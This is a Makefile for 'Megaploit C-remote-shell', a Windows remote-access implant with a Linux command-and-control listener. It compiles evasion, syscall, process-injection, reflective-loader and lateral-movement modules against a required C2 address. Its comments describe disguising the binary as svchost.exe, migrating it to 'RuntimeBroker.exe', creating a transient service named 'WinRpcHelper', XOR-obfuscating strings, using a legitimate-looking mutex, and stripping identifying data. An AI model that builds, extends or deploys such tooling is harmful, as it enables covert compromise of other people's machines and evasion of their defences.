# ============================================================================
# C-remote-shell â€” Makefile
# ============================================================================
# Builds the Megaploit C-remote-shell Windows EXE client using MSVC or MinGW.
#
# Targets
# -------
#   make              â€” auto-detect compiler, build client + server
#   make client       â€” build the client only
#   make server       â€” build the server only (serverShell.c, Windows)
#   make clean        â€” remove compiled binaries
#
# Compiler selection (in order of preference)
# --------------------------------------------
#   MSVC  â€” run from a "Developer Command Prompt for VS" (cl.exe in PATH)
#   MinGW â€” apt install mingw-w64 on Linux/macOS  (x86_64-w64-mingw32-gcc)
#
# Override via:
#   make CC=cl           (force MSVC)
#   make CC=x86_64-w64-mingw32-gcc  (force MinGW)
#
# Required parameters (no defaults)
# ----------------------------------
#   C2_IP    — IPv4/IPv6 address of the Megaploit listener (required)
#   C2_PORT  — TCP port (default: 50005)
#
#   make C2_IP=10.0.0.1
#   make C2_IP=10.0.0.1 C2_PORT=4444
#
# Build requirements
# ------------------
#   Link: Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib
#         Advapi32.lib  User32.lib
# ============================================================================

# ---------------------------------------------------------------------------
# Auto-detect main compiler (CC) — MSVC or MinGW for the agent
# ---------------------------------------------------------------------------

CC_MSVC   := cl
CC_MINGW  := x86_64-w64-mingw32-gcc

MSVC_OK   := $(shell $(CC_MSVC) 2>NUL; echo $$?)
MINGW_OK  := $(shell which $(CC_MINGW) 2>/dev/null)

ifeq ($(CC),)
  ifneq ($(MSVC_OK),)
    CC := $(CC_MSVC)
  else ifneq ($(MINGW_OK),)
    CC := $(CC_MINGW)
  else
    $(error No C compiler found. Install MSVC (Developer Command Prompt) or MinGW (apt install mingw-w64))
  endif
endif

# ---------------------------------------------------------------------------
# LOADER_CC — dedicated GCC for compiling loader.c into the blob
# ---------------------------------------------------------------------------
# This is ALWAYS a GCC-family compiler — loader.c uses GCC attributes that
# are incompatible with MSVC.  Never set this to cl.exe.
#
# Detection order (first found wins):
#   1. Explicit override: make LOADER_CC=/path/to/gcc
#   2. Windows MSYS2 UCRT64  (C:\msys64\ucrt64\bin\gcc.exe)
#   3. Windows MSYS2 MINGW64 (C:\msys64\mingw64\bin\gcc.exe)
#   4. MinGW cross-compiler  (x86_64-w64-mingw32-gcc)  — Linux/macOS
#   5. Native gcc in PATH    — Linux/macOS with MinGW sysroot
#
# The Python script tools/gen_loader_blob.py performs the same search at
# runtime so you can also call it directly without going through make.
ifeq ($(LOADER_CC),)
  ifneq ($(wildcard C:/msys64/ucrt64/bin/gcc.exe),)
    LOADER_CC := C:/msys64/ucrt64/bin/gcc.exe
  else ifneq ($(wildcard C:/msys64/mingw64/bin/gcc.exe),)
    LOADER_CC := C:/msys64/mingw64/bin/gcc.exe
  else ifneq ($(shell which x86_64-w64-mingw32-gcc 2>/dev/null),)
    LOADER_CC := x86_64-w64-mingw32-gcc
  else ifneq ($(shell which gcc 2>/dev/null),)
    LOADER_CC := gcc
  else
    LOADER_CC :=
  endif
endif

# ---------------------------------------------------------------------------
# Configurable parameters
# ---------------------------------------------------------------------------

# C2_IP is REQUIRED — no default.  Pass on the command line:
#   make C2_IP=10.0.0.1
# Omitting it produces a hard compile error (enforced by config.h).
ifeq ($(C2_IP),)
  $(error C2_IP is required: make C2_IP=<address>  [C2_PORT=<port>])
endif

C2_PORT  ?= 50005
NAME     ?= megaploit_c_agent

# SECRET_KEY — optional 64-char hex string (32 bytes) to embed in the binary.
# When provided the agent needs no secret.key file on the target.
# Generate a key + ready-to-use make invocation with:
#   python tools/gen_key.py
#
# Example:
#   make SECRET_KEY=aabbccddeeff...
#
# The Python helper XORs the raw bytes against SECRET_KEY_MASK (config.h) and
# emits the obfuscated \xNN literal string that the compiler sees.
ifdef SECRET_KEY
  _SK_FLAGS := $(shell python tools/gen_key.py --embed $(SECRET_KEY))
else
  _SK_FLAGS :=
endif

# MUTEX_NAME — optional override for the single-instance mutex name.
# Default (in config.h) looks like a legitimate Windows staging mutex.
# Example:
#   make C2_IP=10.0.0.1 MUTEX_NAME=MyServiceMutex
ifdef MUTEX_NAME
  _MN_FLAGS := -DMUTEX_NAME_RAW=\"$(MUTEX_NAME)\"
else
  _MN_FLAGS :=
endif

# MIGRATE_NAME — optional override for the auto_migrate destination filename.
# Default (in config.h): "RuntimeBroker.exe"  (decoded at runtime from XOR array)
# Example:
#   make C2_IP=10.0.0.1 MIGRATE_NAME=SearchIndexer.exe
ifdef MIGRATE_NAME
  _MIGRATE_FLAGS := -DMIGRATE_NAME_RAW=\"$(MIGRATE_NAME)\"
else
  _MIGRATE_FLAGS :=
endif

# SC_SVC_NAME — optional override for the lateral_sc transient service name.
# Default (in config.h): "WinRpcHelper"  (decoded at runtime from XOR array)
# Example:
#   make C2_IP=10.0.0.1 SC_SVC_NAME=NetDiagSvc
ifdef SC_SVC_NAME
  _SC_SVC_FLAGS := -DSC_SVC_NAME_RAW=\"$(SC_SVC_NAME)\"
else
  _SC_SVC_FLAGS :=
endif

# ---------------------------------------------------------------------------
# Source files
# ---------------------------------------------------------------------------

# Refactored client/ build (preferred)
CLIENT_SRCS := client/core/main.c               \
               client/evasion/spoof.c            \
               client/evasion/peb_walk.c         \
               client/evasion/syscall.c          \
               client/evasion/evasion.c          \
               client/core/ntcalls.c             \
               client/shell/shell.c              \
               client/shell/handlers_system.c    \
               client/shell/handlers_ui.c        \
               client/shell/handlers_lateral.c   \
               client/inject/inject.c            \
               tls/tls_client.c

# PE VERSIONINFO resource (client/inject/agent.rc)
# Compiled to client/inject/agent.res by windres (MinGW) or rc.exe (MSVC) and
# linked into the final EXE so GetFileVersionInfoA returns plausible svchost.exe
# fields.
AGENT_RC  := client/inject/agent.rc
AGENT_RES := client/inject/agent.res

# Reflective loader blob
# The blob is auto-generated by tools/gen_loader_blob.py.
# A pre-built blob is committed to the repo so clones without a GCC
# cross-compiler still build successfully.
LOADER_BLOB := client/inject/loader_blob.h

# These intermediate files are only needed when regenerating the blob.
LOADER_OBJ  := client/inject/loader.o
LOADER_BIN  := client/inject/loader_func.bin

# Legacy single-file build (Source.c + shared tls/tls_client.c)
LEGACY_SRCS := Source.c tls/tls_client.c

# Refactored POSIX server (server/main.c + server/server.c + server/prompt.c)
# Compiled on Linux/macOS with native gcc â€” NOT with the Windows cross-compiler.
SERVER_REFACTORED_SRCS := server/main.c server/server.c server/prompt.c

# Legacy single-file POSIX server
SERVER_LEGACY_SRCS := serverShell.c

# ---------------------------------------------------------------------------
# MSVC flags
# ---------------------------------------------------------------------------

# /O1        â€" optimise for size (smaller than /O2 for agent use)
# /GS-       â€" disable stack buffer security cookies (saves ~1 KB overhead)
# /Gy        â€" function-level linking (linker can dead-strip unused funcs)
# /DNDEBUG   â€" strip asserts and debug strings
# /GL        â€" whole-program optimisation
# /link /OPT:REF /OPT:ICF â€" dead-code elimination at link time
MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
                /Iclient/core /Iclient/evasion /Iclient/inject /Iclient/shell /Itls \
                /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) $(_SK_FLAGS) $(_MN_FLAGS) \
                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS)
MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib Shell32.lib

# ---------------------------------------------------------------------------
# windres — MinGW resource compiler
# ---------------------------------------------------------------------------
# Detection mirrors LOADER_CC: prefer MSYS2 UCRT64, fall back to cross or PATH.
# windres lives alongside gcc in each MSYS2 installation.
#
# When running windres from a native Windows shell (PowerShell / cmd.exe),
# its default preprocessor launch fails because it uses popen() which needs
# a POSIX shell in PATH.  Pass --preprocessor=<cat> so windres skips the C
# preprocessor entirely (the RC file has no preprocessor directives).
# On Linux/macOS popen() works fine and the --preprocessor flag is harmless.
ifeq ($(WINDRES),)
  ifneq ($(wildcard C:/msys64/ucrt64/bin/windres.exe),)
    WINDRES    := C:/msys64/ucrt64/bin/windres.exe
    WINDRES_PP := C:/msys64/usr/bin/cat.exe
  else ifneq ($(wildcard C:/msys64/mingw64/bin/windres.exe),)
    WINDRES    := C:/msys64/mingw64/bin/windres.exe
    WINDRES_PP := C:/msys64/usr/bin/cat.exe
  else ifneq ($(shell which x86_64-w64-mingw32-windres 2>/dev/null),)
    WINDRES    := x86_64-w64-mingw32-windres
    WINDRES_PP :=
  else ifneq ($(shell which windres 2>/dev/null),)
    WINDRES    := windres
    WINDRES_PP :=
  else
    WINDRES    :=
    WINDRES_PP :=
  endif
endif
# Build the --preprocessor flag only when we have a specific cat path
ifneq ($(WINDRES_PP),)
  _WINDRES_PP_FLAG := --preprocessor=$(WINDRES_PP)
else
  _WINDRES_PP_FLAG :=
endif

# ---------------------------------------------------------------------------
# MinGW flags
# ---------------------------------------------------------------------------

# -Os          â€” optimise for size
# -s           â€” strip all symbols from the output binary
# -ffunction-sections / -fdata-sections + --gc-sections â€” dead code removal
# -fno-ident   â€” omit GCC version string from binary
# -fno-asynchronous-unwind-tables â€” strip .eh_frame / .pdata (saves ~10-15%)
# -mwindows    â€” GUI subsystem: no console window, no AllocConsole needed
# INCLUDE_CONFIG: if megaploit_build_config.h exists, inject it automatically.
# This carries C2_IP, C2_PORT, SECRET_KEY_BYTES, DISABLE_AUTO_MIGRATE, DISABLE_EVASION
# so the operator only needs to run _make_config.py before make.
_CONFIG_HDR := $(wildcard megaploit_build_config.h)
_INCLUDE_FLAG := $(if $(_CONFIG_HDR),-include megaploit_build_config.h,)

# -I flags for the new subdirectory layout:
#   each subdir needs its siblings + tls/ on the search path
_CLIENT_INCLUDES := -Iclient/core -Iclient/evasion -Iclient/inject -Iclient/shell -Itls

MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
                -ffunction-sections -fdata-sections                     \
                -fno-ident -fno-asynchronous-unwind-tables              \
                $(_CLIENT_INCLUDES)                                      \
                -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT) $(_SK_FLAGS) $(_MN_FLAGS) \
                $(_MIGRATE_FLAGS) $(_SC_SVC_FLAGS) $(CFLAGS_EXTRA) $(_INCLUDE_FLAG)
MINGW_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all
MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -lshell32 -mwindows

# ---------------------------------------------------------------------------
# Detect MSVC vs MinGW
# ---------------------------------------------------------------------------

ifeq ($(CC),$(CC_MSVC))
  # â"€â"€ MSVC â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
  CLIENT_OUT := $(NAME).exe
  LEGACY_OUT := $(NAME)_legacy.exe
  SERVER_OUT := serverShell.exe

  client:
	rc.exe /nologo $(AGENT_RC)
	$(CC) $(MSVC_CFLAGS) $(CLIENT_SRCS) $(AGENT_RES) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(CLIENT_OUT)
	@echo [+] Client built: $(CLIENT_OUT)

  legacy:
	$(CC) $(MSVC_CFLAGS) $(LEGACY_SRCS) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(LEGACY_OUT)
	@echo [+] Legacy client built: $(LEGACY_OUT)

  server:
	@echo [!] serverShell.c is a POSIX server -- compile on Linux with gcc, not MSVC.

  clean:
	-del /F /Q *.exe *.obj *.pdb *.ilk client\inject\agent.res 2>NUL

else
  # â"€â"€ MinGW â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
  CLIENT_OUT := $(NAME).exe
  LEGACY_OUT := $(NAME)_legacy.exe
  SERVER_OUT := serverShell.exe

  # ── Resource compilation (windres) ────────────────────────────────────
  # The .res object is only built when windres is available.  If not found,
  # the agent builds without a version resource (still functional, just
  # missing the VERSIONINFO block that makes it look like svchost.exe).
  ifneq ($(WINDRES),)
    $(AGENT_RES): $(AGENT_RC)
	$(WINDRES) $(_WINDRES_PP_FLAG) -i $(AGENT_RC) -o $(AGENT_RES) --output-format=coff
	@echo "[+] Resource compiled: $(AGENT_RES)"
    _RES_OBJ := $(AGENT_RES)
  else
    $(AGENT_RES):
	@echo "[*] windres not found — building without VERSIONINFO resource"
	@echo "    Install with: pacman -S mingw-w64-ucrt-x86_64-binutils (MSYS2)"
    _RES_OBJ :=
  endif

  client: $(LOADER_BLOB) $(AGENT_RES)
	$(CC) $(MINGW_CFLAGS) $(CLIENT_SRCS) $(_RES_OBJ) -o $(CLIENT_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
	@echo "[+] Client built: $(CLIENT_OUT)"

  # ── Blob regeneration ─────────────────────────────────────────────────
  # Targets:
  #   make blob          — regenerate loader_blob.h using LOADER_CC
  #   make blob-verify   — verify committed blob matches a fresh build (CI)
  #
  # The blob is only regenerated when loader.c or loader.h change AND
  # LOADER_CC is available.  If LOADER_CC is not found, the committed blob
  # is used silently (which is the correct behaviour for a clean clone that
  # just wants to build the agent).

  ifneq ($(LOADER_CC),)
    # LOADER_CC found — real regeneration rule
    $(LOADER_BLOB): client/inject/loader.c client/inject/loader.h
 python tools/gen_loader_blob.py --cc "$(LOADER_CC)"
 @echo "[+] Loader blob regenerated: $(LOADER_BLOB)"

    blob: client/inject/loader.c client/inject/loader.h
 python tools/gen_loader_blob.py --cc "$(LOADER_CC)"

    blob-verify:
	python tools/gen_loader_blob.py --cc "$(LOADER_CC)" --verify

  else
    # No LOADER_CC — use the committed blob, print a notice
    $(LOADER_BLOB):
	@echo "[*] LOADER_CC not found — using committed $(LOADER_BLOB)"
	@echo "    To regenerate: install GCC/mingw-w64 then run: make blob"
	@test -f $(LOADER_BLOB) || (echo "ERROR: $(LOADER_BLOB) missing and cannot be built"; exit 1)

    blob:
	$(error LOADER_CC not found. Install GCC: pacman -S mingw-w64-ucrt-x86_64-gcc (MSYS2) or apt install mingw-w64 (Linux))

    blob-verify:
	@echo "[*] LOADER_CC not found — skipping blob verification"
  endif

  legacy:
	$(CC) $(MINGW_CFLAGS) $(LEGACY_SRCS) -o $(LEGACY_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
	@echo "[+] Legacy client built: $(LEGACY_OUT)"

  server:
	@echo "[!] serverShell.c is a POSIX server -- compile on Linux with: gcc serverShell.c -o serverShell"

  clean:
	rm -f *.exe
	-rm -f client/loader.o client/loader_func.bin client/agent.res
	@echo "[*] Note: client/loader_blob.h is a committed artefact — not deleted."
	@echo "    Run: git checkout client/loader_blob.h  to restore it."

endif

# ---------------------------------------------------------------------------
# POSIX server targets (Linux / macOS only â€” use native gcc, not MinGW)
# ---------------------------------------------------------------------------
# These targets are compiler-agnostic and always use the system gcc.
# They are intentionally NOT part of the default `all` target because they
# produce Linux ELFs, not Windows EXEs.
#
# Override the listen port via:
#   make server-posix LISTEN_PORT=4444

LISTEN_PORT ?= 50005

POSIX_CFLAGS := -O2 -Wall -Wextra -Werror=implicit-function-declaration \
                -DLISTEN_PORT=$(LISTEN_PORT)

server-posix:
	gcc $(POSIX_CFLAGS) $(SERVER_REFACTORED_SRCS) -o serverShell_refactored
	@echo "[+] Refactored server built: serverShell_refactored"

server-posix-legacy:
	gcc $(POSIX_CFLAGS) $(SERVER_LEGACY_SRCS) -o serverShell_legacy
	@echo "[+] Legacy server built: serverShell_legacy"

# ---------------------------------------------------------------------------
# Default target
# ---------------------------------------------------------------------------

all: client

.PHONY: all client legacy server server-posix server-posix-legacy clean blob blob-verify
